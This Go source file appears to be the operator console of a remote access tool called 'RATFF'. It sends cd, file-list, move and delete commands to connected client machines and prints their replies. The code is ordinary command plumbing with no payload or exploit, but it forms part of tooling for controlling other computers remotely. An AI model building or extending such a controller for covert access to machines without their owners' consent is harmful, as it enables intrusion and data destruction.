package main

import (
	"time"

	"RATFF/shared"
)

func cdClient(id string, dir string) {
	clients, err := fetchClients()
	if err != nil {
		PrintError(Tf("fetch_clients_failed", err))
		return
	}

	found := false
	for _, c := range clients {
		if c.ID == id {
			found = true
			break
		}
	}

	if !found {
		PrintError(T("client_not_exists"))
		return
	}

	payload := map[string]interface{}{
		"client_id": id,
		"command":   "cd",
		"payload":   map[string]interface{}{"dir": dir},
	}

	ch := make(chan shared.Message, 1)
	pendingMu.Lock()
	pendingCmd[id] = &pendingCommand{ch: ch}
	pendingMu.Unlock()

	if err := postCommand(payload); err != nil {
		PrintError(Tf("send_command_failed", err))
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
		return
	}

	select {
	case msg := <-ch:
		if msg.Payload != nil {
			if errMsg, ok := msg.Payload["error"].(string); ok {
				PrintError(Tf("cd_failed", errMsg))
			} else if currentDir, ok := msg.Payload["current_dir"].(string); ok {
				PrintSuccess(Tf("cd_success", dir, currentDir))
			}
		}
	case <-time.After(10 * time.Second):
		PrintError(T("command_timeout"))
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
	}
}

func listFiles(id, path string) {
	payload := map[string]interface{}{"path": path}

	msg := waitForCommandResponseWithMsg(id, shared.CmdFileList, payload, 10*time.Second)
	if msg == nil {
		return
	}

	if msg.Payload == nil {
		PrintError(T("file_list_empty"))
		return
	}

	if errMsg, ok := msg.Payload["error"].(string); ok {
		PrintError(Tf("file_list_failed", errMsg))
		return
	}

	currentPath, _ := msg.Payload["path"].(string)
	filesInterface, ok := msg.Payload["files"].([]interface{})
	if !ok {
		PrintError(T("file_list_parse_failed"))
		return
	}

	PrintFileTable(currentPath, filesInterface)
}

func moveFile(id, originPath, newPath string) {
	payload := map[string]interface{}{
		"origin_path": originPath,
		"new_path":    newPath,
	}

	msg := waitForCommandResponseWithMsg(id, shared.CmdFileMove, payload, 10*time.Second)
	if msg == nil {
		return
	}

	if msg.Payload == nil {
		PrintError(T("file_move_failed"))
		return
	}

	if errMsg, ok := msg.Payload["error"].(string); ok {
		PrintError(Tf("file_move_failed_detail", errMsg))
		return
	}

	PrintSuccess(Tf("file_move_success", originPath, newPath))
}

func deleteFile(id, path string) {
	payload := map[string]interface{}{"path": path}

	msg := waitForCommandResponseWithMsg(id, shared.CmdFileDelete, payload, 10*time.Second)
	if msg == nil {
		return
	}

	if msg.Payload == nil {
		PrintError(T("file_delete_failed"))
		return
	}

	if errMsg, ok := msg.Payload["error"].(string); ok {
		PrintError(Tf("file_delete_failed_detail", errMsg))
		return
	}

	PrintSuccess(Tf("file_delete_success", path))
}
